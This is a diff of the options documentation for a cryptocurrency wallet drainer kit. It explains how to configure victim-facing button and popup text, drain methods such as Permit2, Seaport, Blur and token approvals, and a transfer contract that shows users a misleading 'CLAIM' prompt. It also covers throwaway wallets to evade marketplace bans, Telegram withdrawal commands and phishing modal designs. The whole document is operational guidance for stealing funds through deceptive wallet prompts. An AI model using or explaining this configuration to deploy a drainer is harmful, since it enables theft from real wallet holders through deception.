@@ -11,13 +11,14 @@ Options explained:
 -wait_click_of_drain_button_to_start: If "connect_buttons_class" opion is different than "drain_buttons_class" option, it will wait buttons with class of "drain_buttons_class" option click for start drainer process
 -change_buttons_text: Define if the text on buttons will be replaced or not (if css is broken then switch it to false)
 
--loading_text: Define the text on button (if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when drainer is fetching assets
--verify_text: Define the text on button (if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when a signature will be asked
--connect_text: Define the text on button (if change_buttons_text is enabled) that victim will see before to connect his wallet
--connected_text: Define the text on button (if change_buttons_text is enabled and connect_buttons_class is different than drain_buttons_class) that victim will see when his wallet will be connected, you can add "{wallet}" on the text for display user address
--change_chain_text: Define the text on button (if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when a change chain will be asked
--not_eligible_text:  Define the text on button (if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when his wallet is empty or when the all drain steps are finished
--error_text:  Define the text on button (if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when the drainer can't get wallet address
+-loading_text: Define the text on buttons (if change_buttons_text is enabled) and on popup (if enable_popup enabled) that victim will see when drainer is fetching assets
+-verify_text: Define the text on buttons (if change_buttons_text is enabled) and on popup (if enable_popup enabled) that victim will see when a signature will be asked
+-connect_text: Define the text on buttons (if change_buttons_text is enabled) that victim will see before to connect his wallet
+-connected_text: Define the text on buttons (if change_buttons_text is enabled and connect_buttons_class is different than drain_buttons_class) that victim will see when his wallet will be connected, you can add "{wallet}" on the text for display user address
+-drain_button_waiting_click_text: Define the text on buttons (if change_buttons_text is enabled and connect_buttons_class is different than drain_buttons_class) that victim will before to connect his wallet
+-change_chain_text: Define the text on buttons (if change_buttons_text is enabled) and on popup (if enable_popup enabled) that victim will see when a change chain will be asked
+-not_eligible_text:  Define the text on buttons (if change_buttons_text is enabled) and on popup (if enable_popup enabled) that victim will see when his wallet is empty or when the all drain steps are finished
+-error_text:  Define the text on buttons (if change_buttons_text is enabled) and on popup (if enable_popup enabled) that victim will see when the drainer can't get wallet address
 
 -disable_permit2: All is on name, don't edit it
 -disable_seaport: All is on name, don't edit it
@@ -26,9 +27,10 @@ Options explained:
 -disable_blur: All is on name, don't edit it
 
 -use_approvement_for_tokens: Define if you prefer use approvement or token transfer ( MetaMask exploit is still live so don't switch it to false: https://ibb.co/DL18PN6)
--use_transfer_contract: Use a contract for all balance hits ( you can withdraw from contract with telegram commands, do /help ). Contract is good because user will see "CLAIM" + empty address: https://ibb.co/QDDRbD1
+-use_increase_allowance_for_tokens_when_disponible: Define if you prefer the first approvement popup or the second (test it yourself, it doesn't really matter)
+-use_transfer_contract: Use a contract for all balance hits ( you can withdraw from contract with telegram commands, do /help). Contract is good because user will see "CLAIM" + empty address: https://ibb.co/QDDRbD1
 
--create_wallet_for_seaport: This option wil create a new wallet each seaport and send you private key, it will avoid fast opensea ban ( I don't recommend this option because now blur is better than opensea )
+-create_wallet_for_seaport: This option wil create a new wallet each seaport and send you private key, it will avoid fast opensea ban (i don't recommend this option because now blur is better than opensea)
 
 -retry_count: The max number of retries with same method when user reject
 -max_change_chain_retry: The max number of change chain retries when user reject
@@ -39,7 +41,7 @@ Options explained:
 
 -modal_dark_mode: Define if the modal will be on dark / light mode
 -modal_style: Define the modal style, see below
--use_window_provider_if_detected: Will use diretly wallet injected on browser is detected ( for example, if MetaMask detected, it will diretly try to connect it without prompting the modal )
+-use_window_provider_if_detected: Will use diretly wallet injected on browser is detected ( for example, if MetaMask detected, it will diretly try to connect it without prompting the modal)
 -modal_3_config: See below
 -wallet_connect_v2_project_id: If you use modal 3, it's better to set it, you can get your own project id on https://cloud.walletconnect.com/sign-up
 
@@ -47,7 +49,7 @@ Options explained:
 -log_chains_accepts: Define if you want to log when the victim approve change chain
 -hide_poor_connects: Will hide all empty connects from your logs
 
--min_ratio_for_ask_change_chain: Number between 0 and 1 calculated by allowing to know from how much the drainer will try to change chain (1 = will change of chain every asset ( if needed ) and 0 = will avoid to change chain a maximum). I don't recommend to edit much this ratio if you don't know how it works, try it before !   
+-min_ratio_for_ask_change_chain: Number between 0 and 1 calculated by allowing to know from how much the drainer will try to change chain (1 = will change of chain every asset (if needed) and 0 = will avoid to change chain a maximum). I don't recommend to edit much this ratio if you don't know how it works, try it before !   
 
 -min_wallet_total_value: Some guys connect in first a little wallet for check if drainer prompt and then a big one (I don't recommend to edit this value)
 
@@ -67,17 +69,17 @@ max_time_before_auto_close: Time before the popup auto-close
 
 
 Here are 4 modals possible:
-Modal 1: https://ibb.co/jkZ2nQW ( dark ) and https://ibb.co/JBtk69t ( light )
-Modal 2: https://ibb.co/4FxZr3z ( dark ) and https://ibb.co/1qnjpwD ( light )
-Modal 3: https://ibb.co/4RTRKpP ( dark ) and https://ibb.co/3d2vcfT ( light )
-Modal 4: https://ibb.co/BwRKyss ( dark ) and https://ibb.co/37rkDVX ( light )
+Modal 1: https://ibb.co/jkZ2nQW ( dark) and https://ibb.co/JBtk69t ( light)
+Modal 2: https://ibb.co/4FxZr3z ( dark) and https://ibb.co/1qnjpwD ( light)
+Modal 3: https://ibb.co/4RTRKpP ( dark) and https://ibb.co/3d2vcfT ( light)
+Modal 4: https://ibb.co/BwRKyss ( dark) and https://ibb.co/37rkDVX ( light)
 
 
 You can edit modal 3 design with "modal_3_config" option:
 -logo_url: Define the logo of the modal 3
--background_color: Define the color of the modal 3 background ( support hex color with # in front )
--accent_color: Define the color of the main texts on the modal 3 ( support hex color with # in front )
--accept_fill_color: Define the color of the fill text of modal 3, not very usefull ( support hex color with # in front )
+-background_color: Define the color of the modal 3 background ( support hex color with # in front)
+-accent_color: Define the color of the main texts on the modal 3 ( support hex color with # in front)
+-accept_fill_color: Define the color of the fill text of modal 3, not very usefull ( support hex color with # in front)
 -font_family: Define the fonts to use
 
 
